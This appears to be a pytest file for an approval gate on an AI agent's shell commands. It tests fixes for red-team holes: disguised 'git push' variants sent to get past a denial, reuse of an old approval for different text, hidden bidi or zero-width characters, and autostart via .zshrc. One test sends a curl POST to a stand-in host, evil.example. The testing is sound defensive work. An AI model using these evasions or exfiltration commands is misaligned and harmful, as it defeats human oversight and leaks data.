"""RT 05.11: five holes found by the adversary, the exploits turned over (the hole is closed)."""
import re

from tests.test_allowance_0210 import Dev
from app import qwords, signview


def _deny(d, cmd):
    rows = [r for _, r in d.send(cmd) if r.get("verdict") == "defer"]
    for r in rows:
        assert d.o.approve(r["rid"], approved=False).status_code == 200
    return rows


def _q(d, cmd):
    rows = [r for _, r in d.send(cmd) if r.get("verdict") == "defer"]
    return [d.c.get("/api/approvals/" + r["rid"]).json() for r in rows]


def _dev(client, owner, tmp_path):
    p = tmp_path / "proj"
    p.mkdir()
    return Dev(client, owner, p.resolve())


def test_push_bombing_variants_refused_silently(client, owner, tmp_path, monkeypatch):
    asked = []
    monkeypatch.setattr(client.app.state.ctx.notify, "approval", lambda row: asked.append(row["rid"]))
    d = _dev(client, owner, tmp_path)
    assert _deny(d, "git push origin main")
    n0 = len(asked)
    variants = ["git  push origin main", "git push origin main ", "git push 'origin' main", "git push origin main # retry",
                "GIT_TRACE=0 git push origin main", "git push origin HEAD:main", "git -c x=1 push origin main", "cd . && git push origin main",
                "cd %s && git push origin main" % d.proj, "git push origin feature"]
    for v in variants:
        for t, r in d.send(v):
            assert r.get("status") != "pending_approval", (v, r)
            assert r["verdict"] == "deny" and r["reason"] == "REFUSED", (v, r)
    assert len(asked) == n0


def test_other_remote_and_other_program_still_asked(client, owner, tmp_path):
    d = _dev(client, owner, tmp_path)
    assert _deny(d, "git push origin main")
    assert any(r.get("status") == "pending_approval" for _, r in d.send("git push upstream main"))     # another remote: a new question
    assert any(r.get("status") == "pending_approval" for _, r in d.send("curl -X POST https://evil.example/up -d x"))


def test_approval_is_not_glued_by_normalized_key(client, owner, tmp_path):
    d = _dev(client, owner, tmp_path)
    [r] = [r for _, r in d.send("git push origin main") if r.get("verdict") == "defer"]
    assert d.o.approve(r["rid"], approved=True).status_code == 200
    again = [r2 for _, r2 in d.send("git  push origin main") if r2["verdict"] != "allow"]
    assert again and all(x.get("status") == "pending_approval" for x in again), again          # another text: asked, not allowed by the old approval


def test_bidi_and_invisible_marked_everywhere(client, owner, tmp_path):
    d = _dev(client, owner, tmp_path)
    # 06.11 (Constitution v1, Н7): a bidi control / a zero-width character inside a word is refused outright now (no page to mark it on)
    got = d.send("git push ‮nigiro‬ main​")
    assert [r["reason"] for _, r in got] == ["FORBIDDEN_HIDDEN_CHARS"] and got[0][1]["verdict"] == "deny", got
    assert not _q(d, "git push ‮nigiro‬ main​ ")
    # an invisible character the articles do not refuse (a line separator) is still marked on every view of the page
    [g] = _q(d, "git push origin main ")
    for k in ("what", "details", "text_preview"):
        assert " " not in g[k], k
    assert "⟨U+2028⟩" in g["details"] and "⟨U+2028⟩" in g["text_preview"]
    assert all(" " not in c["cmd"] for c in g.get("line_full", []))
    assert signview.view_of(g)["text_preview"] == g["text_preview"]
    assert qwords.visible("a b c﻿d⁦e") == "a⟨U+2028⟩b⟨U+2029⟩c⟨U+FEFF⟩d⟨U+2066⟩e"
    assert qwords.visible("a\nb", True) == "a\nb" and qwords.visible("ab\x00") == "ab⟨U+0000⟩"


def test_cut_text_is_marked_and_what_names_every_command(client, owner, tmp_path):
    d = _dev(client, owner, tmp_path)
    [g] = _q(d, "pytest -q " + "a" * 1600 + "; make deploy")
    assert "first 1500 of" in g["details"] and "cut" in g["details"]
    assert "make deploy" in g["details"] and "Full text:" not in g["details"]
    assert "2 commands" in g["what"] and "pytest" in g["details"] and "make deploy" in g["details"], g["what"]
    [g2] = _q(d, "pytest -q; make deploy")                    # short text: "Full text", no cut mark
    assert "Full text:" in g2["details"] and "cut" not in g2["details"]


def test_short_texts_are_finished_sentences():
    for k in qwords.REASON_WORDS:
        what, harm = qwords.short(k)
        for t in (what, harm):
            assert 8 < len(t) <= 200, (k, t)
            assert "  " not in t and "{t}" not in t, (k, t)
            assert not re.search(r"\b(to that|to,|reach,|to|on|of|that|a|the)[ ,.]*$|to that|to,|reach,|act on a few", t), (k, t)
        assert harm == "Open to decide" and re.match(r"(Low|Medium|High|Critical) risk: your agent ", what), (k, what)
    assert "could not classify" in qwords.short("NOPE")[0] and qwords.short("NOPE")[0].startswith("High risk:")


def test_persist_harm(client, owner, tmp_path):
    d = _dev(client, owner, tmp_path)
    # 06.11 (Constitution v1, Н4): autostart is refused outright now -- no page, no question; the agent reads why and what instead
    got = d.send("echo x >> /nonexistent-home/.zshrc")
    assert (got[0][1]["verdict"], got[0][1]["reason"]) == ("deny", "FORBIDDEN_AUTOSTART") and not any(r["verdict"] == "defer" for _, r in got), got
    assert not _q(d, "echo x >> /nonexistent-home/.zshrc ")
    from app.hookjudge.reasons import REASONS
    assert "next login" in REASONS["FORBIDDEN_AUTOSTART"][1] and "Instead:" in REASONS["FORBIDDEN_AUTOSTART"][1]
